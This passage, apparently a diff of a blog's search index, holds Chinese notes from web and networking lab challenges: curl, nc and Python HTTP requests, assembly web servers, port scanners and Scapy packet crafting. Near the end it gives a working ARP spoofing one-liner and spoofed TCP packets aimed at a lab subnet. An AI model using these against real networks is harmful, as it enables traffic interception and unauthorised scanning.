+<p>curl 127.0.0.1:80 -H “Content-Type:application&#x2F;json” -d ‘{“a”:”17aa707fc88e62cab3cf40403d43e025”,”b”:{“c”:”6869f0a6”,”d”:[“193c021a”,”1de1e1a0 9384ce04&amp;8ae5cbbb#6<br>eabcff1”]}}’</p>
+</blockquote>
+<p>重定向</p>
+<blockquote>
+<p>curl 127.0.0.1 –location-trusted</p>
+</blockquote>
+<p>获取cookie</p>
+<blockquote>
+<p>curl -c - 127.0.0.1:80</p>
+</blockquote>
+<p>发送cookie</p>
+<blockquote>
+<p>curl –cookie 71ed1a72ed58d7146e2798f2945a11dc 127.0.0.1</p>
+</blockquote>
+<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><ul>
+<li>nc 发送get指令</li>
+</ul>
+<blockquote>
+<p>printf “GET &#x2F;index.html HTTP&#x2F;1.1\r\nUser-Agent: nc&#x2F;0.0.1\r\nHost: 127.0.0.1\r\nAccept: *&#x2F;*\r\n\r\n” | nc 127.0.0.1 80</p>
+</blockquote>
+<p>注意：更改为其他input方式，否则url编码会过不了</p>
+<blockquote>
+<p> hacker@talking-web~level14:&#x2F;$ nc 127.0.0.1 80<br>GET &#x2F;index.html?a&#x3D;a1834ce5ff3a8434e97e721b647e84a0 HTTP&#x2F;1.1</p>
+</blockquote>
+<p>可以：nc 127.0.0.1 80 &lt; exp.txt</p>
+<p>tips: 这里nc会自动把\n处理成\r\n</p>
+<pre><code>POST / HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-Length: 34
+
+a=b7f875a1d22f3884e72c830ccd2dae79
+</code></pre>
+<pre><code>POST / HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/json
+Content-Length: 40
+
+&#123;&quot;a&quot;:&quot;fb1fcbc678ea9ab1c60e7d89291a6ad0&quot;&#125;
+</code></pre>
+<p>nc信任重定向</p>
+<p>cookie：</p>
+<pre><code>POST /08ef55da8a1e676feea750320e3b0942 HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/json
+Content-Length: 116
+Cookie: cookie=c106c3a4d0d7620eee3b2cd121ff77ec
+Referer: 127.0.0.1
+
+</code></pre>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><ul>
+<li>python 发送get（不需要url编码）</li>
+</ul>
+<pre><code class="python">import requests
+headers = &#123;
+    &#39;Host&#39;:&quot;71da60ef1b789332773275354004e689&quot;,
+&#125;
+response = requests.post(&quot;http://127.0.0.1:80&quot;,params=&#123;&quot;a&quot;:&quot;62e9fb4ed3b5fafd87b163b3a20fef5b&quot;,&quot;b&quot;:&quot;93db500a 663544b4&amp;c0fa24b2#5b3824c1&quot;&#125;,headers=headers)
+print(response.text)
+</code></pre>
+<ul>
+<li>post</li>
+</ul>
+<pre><code class="python">import requests
+import json
+data = &#123;&quot;a&quot;:&quot;fb7a58692e22a3fc71c5017aa0541b00&quot;&#125;
+headers = &#123;
+    &#39;Host&#39;:&quot;71da60ef1b789332773275354004e689&quot;,
+    &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded; charset=utf-8&quot;,
+&#125;
+response = requests.post(&quot;http://127.0.0.1:80&quot;,data=data,headers=headers)
+print(response.text)
+</code></pre>
+<p>json</p>
+<pre><code class="python">import requests
+import json
+data = &#123;&quot;a&quot;:&quot;cb449746a07887172af1ad3bc700d7cc&quot;,&quot;b&quot;:&quot;6b0e7b4b 208ac3c8&amp;2a6652a6#b948b54f&quot;&#125;
+data = json.dumps(data)
+headers = &#123;
+    &#39;Host&#39;:&quot;71da60ef1b789332773275354004e689&quot;,
+    &quot;Content-Type&quot;:&quot;application/json&quot;,
+&#125;
+response = requests.post(&quot;http://127.0.0.1:80&quot;,data=data,headers=headers)
+print(response.text)
+</code></pre>
+<p>Python自动重定向</p>
+<p>Python不需要手动维护cookie</p>
+<h3 id="web-syscall"><a href="#web-syscall" class="headerlink" title="web syscall"></a>web syscall</h3><p>network system calls are mostly big endian</p>
+<p>ip protocol socket:</p>
+<blockquote>
+<p>socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</p>
+</blockquote>
+<pre><code class="asm">    mov rdi, 2
+    mov rsi, 1
+    mov rdx, 0
+    mov rax, 41
+    syscall
+</code></pre>
+<p>bind:</p>
+<blockquote>
+<p>bind(3, {sa_family&#x3D;AF_INET, sin_port&#x3D;htons(80), sin_addr&#x3D;inet_addr(“0.0.0.0”)}, 16)</p>
+</blockquote>
+<pre><code class="asm">    sub rsp, 4
+    mov word ptr [rsp], 2
+    mov word ptr [rsp + 3], 80
+    mov dword ptr [rsp + 4], 0x00000000
+    push rsp
+    pop rsi
+    mov rdi, rax
+    mov rdx, 16
+    mov rax, 49
+    syscall
+</code></pre>
+<p>accept </p>
+<blockquote>
+<p>accept(3, NULL, NULL)</p>
+</blockquote>
+<pre><code class="asm">    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+</code></pre>
+<p>进行接收&amp;回包</p>
+<blockquote>
+<p>[✓] execve(“&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3”, [“&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3”], 0x7f0eeb6ad980 &#x2F;* 0 vars *&#x2F;) &#x3D; 0<br>[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) &#x3D; 3<br>[✓] bind(3, {sa_family&#x3D;AF_INET, sin_port&#x3D;htons(80), sin_addr&#x3D;inet_addr(“0.0.0.0”)}, 16) &#x3D; 0<br>[✓] listen(3, 0)                            &#x3D; 0<br>[✓] accept(3, NULL, NULL)                   &#x3D; 4<br>[✓] read(4, “GET &#x2F; HTTP&#x2F;1.1\r\nHost: localhost\r\nUser-Agent: python-requests&#x2F;2.31.0\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: *&#x2F;*\r\nConnection: keep-alive\r\n\r\n”, 10000) &#x3D; 146<br>[✓] write(4, “HTTP&#x2F;1.0 200 OK\r\n\r\n”, 19) &#x3D; 19<br>[✓] close(4)                                &#x3D; 0<br>[✓] exit(0)                                 &#x3D; ?</p>
+</blockquote>
+<pre><code class="asm">.intel_syntax noprefix
+.globl _start
+.section .text
+_start:
+    mov rdi, 2
+    mov rsi, 1
+    mov rdx, 0
+    mov rax, 41
+    syscall
+    sub rsp, 4
+    mov word ptr [rsp], 2
+    mov word ptr [rsp + 3], 80
+    mov dword ptr [rsp + 4], 0x00000000
+    push rsp
+    pop rsi
+    mov rdi, rax
+    mov rdx, 16
+    mov rax, 49
+    syscall
+    mov rdi, 3
+    mov rsi, 0
+    mov rax, 50
+    syscall
+
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+    mov rdi, 4
+    push rsp
+    pop rsi
+    mov rdx, 10000
+    xor rax, rax
+    syscall
+    sub rsp, 19
+    mov dword ptr [rsp], 0x50545448
+    mov dword ptr [rsp + 4], 0x302e312f
+    mov dword ptr [rsp + 8], 0x30303220
+    mov dword ptr [rsp + 12], 0x0d4b4f20
+    mov qword ptr [rsp + 16], 0xa0d0a
+    push rsp
+    pop rsi
+    mov rdx, 19
+    mov rax, 1
+    syscall
+    mov rdi, 4
+    mov rax, 3
+    syscall
+    mov rdi, 0
+    mov rax, 60
+    syscall
+</code></pre>
+<p>根据接包进行get请求：</p>
+<pre><code class="asm">.intel_syntax noprefix
+.globl _start
+.section .text
+_start:
+    mov rdi, 3
+    mov rax, 3
+    syscall
+
+    mov rdi, 2
+    mov rsi, 1
+    mov rdx, 0
+    mov rax, 41
+    syscall
+    sub rsp, 4
+    mov word ptr [rsp], 2
+    mov word ptr [rsp + 3], 80
+    mov dword ptr [rsp + 4], 0x00000000
+    push rsp
+    pop rsi
+    mov rdi, rax
+    mov rdx, 16
+    mov rax, 49
+    syscall
+    mov rdi, 3
+    mov rsi, 0
+    mov rax, 50
+    syscall
+
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+
+    //fork
+    mov rax, 57
+    syscall
+
+    // read
+    mov rdi, 4
+    push rsp
+    pop rsi
+    mov rdx, 10000
+    xor rax, rax
+    syscall
+    mov rcx, rsp
+    add rcx, 4
+
+
+    // open
+    sub rsp, 9
+    mov byte ptr [rsp], 0x2e
+    mov byte ptr [rsp + 1], 0x2f
+    mov byte ptr [rsp + 2], 0x65
+    mov byte ptr [rsp + 3], 0x78
+    mov byte ptr [rsp + 4], 0x70
+    mov byte ptr [rsp + 5], 0x2e
+    mov byte ptr [rsp + 6], 0x74
+    mov byte ptr [rsp + 7], 0x78
+    mov byte ptr [rsp + 8], 0x74
+    mov byte ptr [rsp + 9], 0x00
+    push rcx
+    mov byte ptr [rcx + 16], 0x00
+    pop rdi
+    mov rsi, 0
+    mov rax, 2
+    syscall
+
+    // read
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 202
+    mov rax, 0
+    syscall
+    mov r8, rax
+
+    // close
+    mov rsi, 5
+    mov rax, 3
+    syscall
+
+    // write
+    mov rdi, 4
+    sub rsp, 24
+    mov dword ptr [rsp],     0x50545448
+    mov dword ptr [rsp + 4], 0x302e312f
+    mov dword ptr [rsp + 8], 0x30303220
+    mov dword ptr [rsp + 12], 0x0d4b4f20
+    mov qword ptr [rsp + 16], 0x000a0d0a
+    push rsp
+    pop rsi
+    mov rdx, 19
+    mov rax, 1
+    syscall
+    add rsp, 24
+
+    // write
+    mov rdi, 4
+    mov rsi, rsp
+    mov rdx, r8
+    mov rax, 1
+    syscall
+
+    // close
+    mov rdi, 4
+    mov rax, 3
+    syscall
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+</code></pre>
+<pre><code class="asm">.intel_syntax noprefix
+.globl _start
+.section .text
+_start:
+    mov rdi, 2
+    mov rsi, 1
+    mov rdx, 0
+    mov rax, 41
+    syscall
+    sub rsp, 4
+    mov word ptr [rsp], 2
+    mov word ptr [rsp + 3], 80
+    mov dword ptr [rsp + 4], 0x00000000
+    push rsp
+    pop rsi
+    mov rdi, rax
+    mov rdx, 16
+    mov rax, 49
+    syscall
+    mov rdi, 3
+    mov rsi, 0
+    mov rax, 50
+    syscall
+
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+    mov r8, rax
+
+    //fork
+    mov rax, 57
+    syscall
+
+    // close
+    mov rdi, r8
+    mov rax, 3
+    syscall
+
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+</code></pre>
+<p>循环开线程接包发包 get</p>
+<pre><code>========= Parent Process ==========
+[ ] execve(&lt;execve_args&gt;) = 0
+[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0
+    - Bind to port 80
+    - Bind to address 0.0.0.0
+[ ] listen(3, 0) = 0
+[ ] accept(3, NULL, NULL) = 4
+[ ] fork() = &lt;fork_result&gt;
+[ ] close(4) = 0
+[ ] accept(3, NULL, NULL) = ?
+
+
+========= Child Process ==========
+[ ] close(3) = 0
+[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;
+[ ] open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3
+[ ] read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;
+[ ] close(3) = 0
+[ ] write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19
+[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;
+[ ] exit(0) = ?
+</code></pre>
+<pre><code class="asm">.intel_syntax noprefix
+.globl _start
+.section .text
+_start:
+parent:
+    // socket
+    mov rdi, 2
+    mov rsi, 1
+    mov rdx, 0
+    mov rax, 41
+    syscall
+    // bind
+    sub rsp, 4
+    mov word ptr [rsp], 2
+    mov word ptr [rsp + 3], 80
+    mov dword ptr [rsp + 4], 0x00000000
+    push rsp
+    pop rsi
+    mov rdi, rax
+    mov rdx, 16
+    mov rax, 49
+    syscall
+    // listen
+    mov rdi, 3
+    mov rsi, 0
+    mov rax, 50
+    syscall
+
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+    mov r8, rax
+
+    //fork
+    mov rax, 57
+    syscall
+
+    cmp rax, 0
+    jz child
+
+    // close
+    mov rdi, 4
+    mov rax, 3
+    syscall
+    jmp parent
+
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+
+child:
+
+    // close
+    mov rdi, 3
+    mov rax, 3
+    syscall
+
+
+
+    // read
+    mov rdi, 4
+    push rsp
+    pop rsi
+    mov rdx, 10000
+    xor rax, rax
+    syscall
+    mov rcx, rsp
+    add rcx, 4
+
+
+    // open
+    sub rsp, 9
+    mov byte ptr [rsp], 0x2e
+    mov byte ptr [rsp + 1], 0x2f
+    mov byte ptr [rsp + 2], 0x65
+    mov byte ptr [rsp + 3], 0x78
+    mov byte ptr [rsp + 4], 0x70
+    mov byte ptr [rsp + 5], 0x2e
+    mov byte ptr [rsp + 6], 0x74
+    mov byte ptr [rsp + 7], 0x78
+    mov byte ptr [rsp + 8], 0x74
+    mov byte ptr [rsp + 9], 0x00
+    push rcx
+    mov byte ptr [rcx + 16], 0x00
+    pop rdi
+    mov rsi, 0
+    mov rax, 2
+    syscall
+
+    // read
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 202
+    mov rax, 0
+    syscall
+    mov r8, rax
+
+    // close
+    mov rsi, 5
+    mov rax, 3
+    syscall
+
+    // write
+    mov rdi, 4
+    sub rsp, 24
+    mov dword ptr [rsp],     0x50545448
+    mov dword ptr [rsp + 4], 0x302e312f
+    mov dword ptr [rsp + 8], 0x30303220
+    mov dword ptr [rsp + 12], 0x0d4b4f20
+    mov qword ptr [rsp + 16], 0x000a0d0a
+    push rsp
+    pop rsi
+    mov rdx, 19
+    mov rax, 1
+    syscall
+    add rsp, 24
+
+    // write
+    mov rdi, 4
+    mov rsi, rsp
+    mov rdx, r8
+    mov rax, 1
+    syscall
+
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+
+    mov rdi, 0
+    mov rax, 60
+    syscall
+</code></pre>
+<p>post 接收参数并写入文件</p>
+<p><img src="/2024/04/14/web%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C/image-20240415202715805.png" alt="image-20240415202715805"></p>
+<pre><code class="asm">.intel_syntax noprefix
+.globl _start
+.section .text
+_start:
+parent:
+    // socket
+    mov rdi, 2
+    mov rsi, 1
+    mov rdx, 0
+    mov rax, 41
+    syscall
+    // bind
+    sub rsp, 4
+    mov word ptr [rsp], 2
+    mov word ptr [rsp + 3], 80
+    mov dword ptr [rsp + 4], 0x00000000
+    push rsp
+    pop rsi
+    mov rdi, rax
+    mov rdx, 16
+    mov rax, 49
+    syscall
+    // listen
+    mov rdi, 3
+    mov rsi, 0
+    mov rax, 50
+    syscall
+
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+    mov r8, rax
+
+    //fork
+    mov rax, 57
+    syscall
+
+    cmp rax, 0
+    jz child
+
+    // close
+    mov rdi, 4
+    mov rax, 3
+    syscall
+    
+    // accept
+    mov rdi, 3
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+
+    jmp parent
+
+child:
+    // close
+    mov rdi, 3
+    mov rax, 3
+    syscall
+
+    // read
+    mov rdi, 4
+    push rsp
+    pop rsi
+    mov rdx, 10000
+    xor rax, rax
+    syscall
+    mov r9, rsp
+    add r9, 5
+    mov r8, rax
+
+    // open
+    sub rsp, 9
+    push r9
+    mov byte ptr [r9 + 16], 0x00
+    pop rdi
+    mov rsi, 65
+    // 这里是八进制......
+    mov rdx, 511
+    mov rax, 2
+    syscall
+
+    // write
+    mov rdi, rax
+    add r9, 178
+    mov rsi, r9    
+    mov rdx, r8
+    sub rdx, 183
+    mov rax, 1
+    syscall
+
+    // close
+    mov rsi, 3
+    mov rax, 3
+    syscall
+
+    // write
+    mov rdi, 4
+    sub rsp, 24
+    mov dword ptr [rsp],     0x50545448
+    mov dword ptr [rsp + 4], 0x302e312f
+    mov dword ptr [rsp + 8], 0x30303220
+    mov dword ptr [rsp + 12], 0x0d4b4f20
+    mov qword ptr [rsp + 16], 0x000a0d0a
+    push rsp
+    pop rsi
+    mov rdx, 19
+    mov rax, 1
+    syscall
+    add rsp, 24
+
+
+    // exit
+    mov rdi, 0
+    mov rax, 60
+    syscall
+</code></pre>
+<p>最终版orz，整合了前面几个操作支持get、post</p>
+<pre><code class="asm">.intel_syntax noprefix
+.globl _start
+.section .text
+_start:
+    // socket
+    mov rdi, 2
+    mov rsi, 1
+    mov rdx, 0
+    mov rax, 41
+    syscall
+    mov rbx, rax
+
+    // bind
+    sub rsp, 4
+    mov word ptr [rsp], 2
+    mov word ptr [rsp + 3], 80
+    mov dword ptr [rsp + 4], 0x00000000
+    push rsp
+    pop rsi
+    mov rdi, rax
+    mov rdx, 16
+    mov rax, 49
+    syscall
+
+    // listen
+    mov rdi, rbx
+    mov rsi, 0
+    mov rax, 50
+    syscall
+parent:
+    // accept
+    mov rdi, rbx
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 43
+    syscall
+    mov r13, rax
+
+    //fork
+    mov rax, 57
+    syscall
+
+    cmp rax, 0
+    jz child
+
+    // close
+    mov rdi, r13
+    mov rax, 3
+    syscall
+    
+    // accept
+//    mov rdi, rbx
+//    xor rsi, rsi
+//    xor rdx, rdx
+//    mov rax, 43
+//    syscall
+
+    jmp parent
+
+child:
+    // close
+    mov rdi, rbx
+    mov rax, 3
+    syscall
+
+    // read
+    mov rdi, r13
+    push rsp
+    pop rsi
+    mov rdx, 10000
+    xor rax, rax
+    syscall
+    mov r15, rax
+    mov r14, rsp
+
+    // &#39;P&#39;
+    cmp byte ptr [r14], 80
+    jz post
+
+get:
+    // open
+    sub rsp, 9
+    add r14, 4
+    push r14
+    mov byte ptr [r14 + 16], 0x00
+    pop rdi
+    mov rsi, 0
+    mov rdx, 0
+    mov rax, 2
+    syscall
+
+    // read
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 10000
+    mov rax, 0
+    syscall
+    mov r12, rax
+
+    // close
+    mov rax, 3
+    syscall
+
+    // write
+    mov rdi, r13
+    sub rsp, 24
+    mov dword ptr [rsp],     0x50545448
+    mov dword ptr [rsp + 4], 0x302e312f
+    mov dword ptr [rsp + 8], 0x30303220
+    mov dword ptr [rsp + 12], 0x0d4b4f20
+    mov qword ptr [rsp + 16], 0x000a0d0a
+    push rsp
+    pop rsi
+    mov rdx, 19
+    mov rax, 1
+    syscall
+    add rsp, 24
+
+    // write
+    mov rdi, r13
+    mov rsi, rsp
+    mov rdx, r12
+    mov rax, 1
+    syscall
+
+    mov rdi, 0
+    mov rax, 60
+    syscall
+
+
+post:
+    add r14, 5
+
+    // open
+    sub rsp, 9
+    push r14
+    mov byte ptr [r14 + 16], 0x00
+    pop rdi
+    mov rsi, 65
+    // 这里是八进制......
+    mov rdx, 511
+    mov rax, 2
+    syscall
+
+    // write
+    mov rdi, rax
+    
+    mov rdx, r15
+    sub rdx, 183
+    cmp rdx, 99
+    jg addOne
+
+    add rdx, 1
+    sub r14, 1
+    
+addOne:
+    add r14, 178
+    mov rsi, r14
+    mov rax, 1
+    syscall
+
+    // close
+    mov rsi, rbx
+    mov rax, 3
+    syscall
+
+    // write
+    mov rdi, r13
+    sub rsp, 24
+    mov dword ptr [rsp],     0x50545448
+    mov dword ptr [rsp + 4], 0x302e312f
+    mov dword ptr [rsp + 8], 0x30303220
+    mov dword ptr [rsp + 12], 0x0d4b4f20
+    mov qword ptr [rsp + 16], 0x000a0d0a
+    push rsp
+    pop rsi
+    mov rdx, 19
+    mov rax, 1
+    syscall
+    add rsp, 24
+
+
+    // exit
+    mov rdi, 0
+    mov rax, 60
+    syscall
+</code></pre>
+<h3 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h3><p>连接</p>
+<blockquote>
+<p>nc 127.0.0.1 80</p>
+</blockquote>
+<p>接听</p>
+<blockquote>
+<p>nc -lp 80</p>
+</blockquote>
+<p>多线程扫描</p>
+<pre><code class="python">import socket
+import threading
+def check_port(hostname, port):
+    try:
+        print(f&#39;testing:&#123;hostname&#125;&#39;)
+        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        sock.settimeout(2)
+        result=sock.connect_ex((hostname,port))
+        if (result == 0):
+            print(f&#39;&#123;hostname&#125;----------&#39;)
+        sock.close()
+    except:
+        pass
+
+for i in range(256):
+    try:
+        t = threading.Thread(target=check_port,args=(f&#39;10.0.0.&#123;i&#125;&#39;,31337))
+        t.start()
+    except:
+        print(&quot;Error: unable to start thread&quot;)
+
+while 1:
+    pass
+</code></pre>
+<p>更好的多线程扫描</p>
+<pre><code class="python">import socket
+import logging
+from concurrent.futures import ProcessPoolExecutor, as_completed
+
+# 配置日志
+logging.basicConfig(filename=&#39;port_check.log&#39;, level=logging.INFO, format=&#39;%(asctime)s - %(message)s&#39;)
+
+def check_port(hostname, port):
+    # print(hostname)
+    # print(port)
+
+    try:
+        # logging.info(f&#39;testing: &#123;hostname&#125;&#39;)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
+        result = sock.connect_ex((hostname, port))
+        if result == 0:
+            logging.info(f&#39;&#123;hostname&#125;----------&#39;)
+            return True
+        sock.close()
+    except:
+        pass
+    return False
+
+def parallel_process(array, function):
+    &quot;&quot;&quot;
+    A parallel version of the map function with a progress bar. 
+
+    Args:
+        array (array-like): An array to iterate over.
+        function (function): A python function to apply to the elements of array
+    Returns:
+        [function(array[0]), function(array[1]), ...]
+    &quot;&quot;&quot;
+    n_jobs = 512  # 线程数
+    with ProcessPoolExecutor(max_workers=n_jobs) as pool:
+        futures = [pool.submit(function, *a) for a in array]  # 使用 *a 解包参数元组
+        kwargs = &#123;
+            &#39;total&#39;: len(futures),
+            &#39;unit&#39;: &#39;it&#39;,
+            &#39;unit_scale&#39;: True,
+            &#39;leave&#39;: True
+        &#125;
+        # Print out the progress as tasks complete
+
+
+if __name__ == &#39;__main__&#39;:
+    array = [(f&#39;10.0.&#123;j&#125;.&#123;i&#125;&#39;, 31337) for i in range(256) for j in range(256)]  # 构造参数数组
+    # array = [(f&#39;192.168.0.&#123;i&#125;&#39;, 31337) for i in range(256)]
+    # print(array)
+    res = parallel_process(array, check_port)
+</code></pre>
+<h3 id="tcpdump劫持"><a href="#tcpdump劫持" class="headerlink" title="tcpdump劫持"></a>tcpdump劫持</h3><blockquote>
+<p>tcpdump -i any port 31337 -w capture.pcap</p>
+</blockquote>
+<h3 id="hijack"><a href="#hijack" class="headerlink" title="hijack"></a>hijack</h3><p>增加ip监听以获取包</p>
+<p><a href="https://ubuntu.com/server/docs/configuring-networks">Configuring networks | Ubuntu</a></p>
+<blockquote>
+<p>ip addr add 10.0.0.2 dev eth0</p>
+</blockquote>
+<p>scapy用法</p>
+<p><a href="https://scapy.readthedocs.io/en/latest/usage.html">Usage — Scapy 2.5.0 documentation</a></p>
+<p>一些可用的指令：</p>
+<blockquote>
+<p>ip route show</p>
+<p>ip route add default via 10.0.0.1</p>
+</blockquote>
+<p>广播Ethernet包（srp1注意增加filter，这样不会收到自己发的包，或者用srp批量都接收）</p>
+<pre><code class="python">from scapy.all import *
+
+# Get your MAC address (assuming you&#39;re on a Linux system)
+
+# Create the Ethernet frame with your MAC address as the source
+eth_frame = Ether(src=&quot;e6:d2:90:8f:34:8f&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;, type=0xFFFF)
+
+# Send the Ethernet frame and receive packets
+reply_packets = srp1(eth_frame, timeout=2, iface=&quot;eth0&quot;, filter=&quot;ether src not e6:d2:90:8f:34:8f&quot;)
+
+# Display received packets
+if reply_packets:
+    print(reply_packets.show())
+else:
+    print(&quot;No reply received.&quot;)
+</code></pre>
+<p>发送ip包（注意，这里是一层一层搭建的，每层的包正常运转下一层的包才能成功发送，！注意！前面的type不能指定，这里是自动对field适应的，指定后会导致后续上层信息丢包）</p>
+<pre><code class="python">from scapy.all import *
+
+eth_frame = Ether(src=&quot;3e:72:ce:70:a9:74&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)
+
+ip_packet = IP(proto=0xFF, dst=&quot;10.0.0.3&quot;,src=&quot;10.0.0.2&quot;)
+packet = eth_frame/ip_packet
+
+reply_packets = srp1(packet, timeout=2, iface=&quot;eth0&quot;)
+
+if reply_packets:
+    print(reply_packets.show())
+else:
+    print(&quot;No reply received.&quot;)
+</code></pre>
+<p>发送tcp包，和上面一样的注意事项就一遍过</p>
+<pre><code class="python">from scapy.all import *
+
+eth_frame = Ether(src=&quot;02:42:0a:00:b5:ef&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)
+
+ip_packet = IP(dst=&quot;10.0.0.3&quot;,src=&quot;10.0.181.239&quot;)
+
+tcp_packet = TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=&quot;APRSF&quot;)
+
+packet = eth_frame/ip_packet/tcp_packet
+
+reply_packets = srp1(packet, timeout=2, iface=&quot;eth0&quot;)
+
+if reply_packets:
+    print(reply_packets.show())
+else:
+    print(&quot;No reply received.&quot;)
+</code></pre>
+<p>官网的demo：<code>a=Ether()/IP(dst=&quot;www.slashdot.org&quot;)/TCP()/&quot;GET /index.html HTTP/1.0 \n\n&quot;</code></p>
+<p>TCP handshake：</p>
+<pre><code class="python">from scapy.all import *
+
+eth_frame = Ether(src=&quot;8a:c9:61:2b:94:3c&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)
+
+ip_packet = IP(dst=&quot;10.0.0.3&quot;,src=&quot;10.0.0.2&quot;)
+
+tcp_packet = TCP(sport=31337, dport=31337, seq=31337, flags=&quot;S&quot;)
+
+packet = eth_frame/ip_packet/tcp_packet
+
+reply_packets = srp1(packet, timeout=2, iface=&quot;eth0&quot;)
+
+if reply_packets:
+    print(reply_packets.show())
+else:
+    print(&quot;No reply received.&quot;)
+
+eth_frame = Ether(src=&quot;8a:c9:61:2b:94:3c&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)
+
+ip_packet = IP(dst=&quot;10.0.0.3&quot;,src=&quot;10.0.0.2&quot;)
+
+tcp_packet = TCP(sport=31337, dport=31337, seq=31338, ack = reply_packets.seq + 1, flags=&quot;A&quot;)
+
+packet = eth_frame/ip_packet/tcp_packet
+
+reply_packets = srp1(packet, timeout=3, iface=&quot;eth0&quot;)
+
+if reply_packets:
+    print(reply_packets[0].show())
+else:
+    print(&quot;No reply received.&quot;)
+</code></pre>
+<p>ARP（注意ARP中的hwsrc需要再设置一次mac，否则接收不到回包）</p>
+<pre><code class="python">from scapy.all import *
+
+eth_frame = Ether(src=&quot;3a:a0:e5:64:0f:e3&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)
+
+arp_packet = ARP(hwsrc=&quot;3a:a0:e5:64:0f:e3&quot;,op=&#39;is-at&#39;,psrc=&quot;10.0.0.2&quot;,pdst=&quot;10.0.0.3&quot;,hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;)
+
+packet = eth_frame/arp_packet
+
+reply_packets = srp1(packet, timeout=3, iface=&quot;eth0&quot;)
+
+if reply_packets:
+    print(reply_packets.show())
+else:
+    print(&quot;No reply received.&quot;)
+
+# print(arp_mitm(&quot;10.0.0.3&quot;,&quot;10.0.0.2&quot;))
+</code></pre>
+<p>ARP欺骗（直接伪造ip即可）</p>
+<pre><code class="python">sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;), dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;is-at&quot;, psrc=&quot;10.0.0.2&quot;, hwsrc=get_if_hwaddr(&quot;eth0&quot;)), iface=&quot;eth0&quot;)
+</code></pre>
+<p>差一个题，稍微复杂，大概知道怎么做但是晚点做吧…</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>铁三awd渗透复盘</title>
+    <url>/2024/04/24/%E9%93%81%E4%B8%89awd%E6%B8%97%E9%80%8F%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
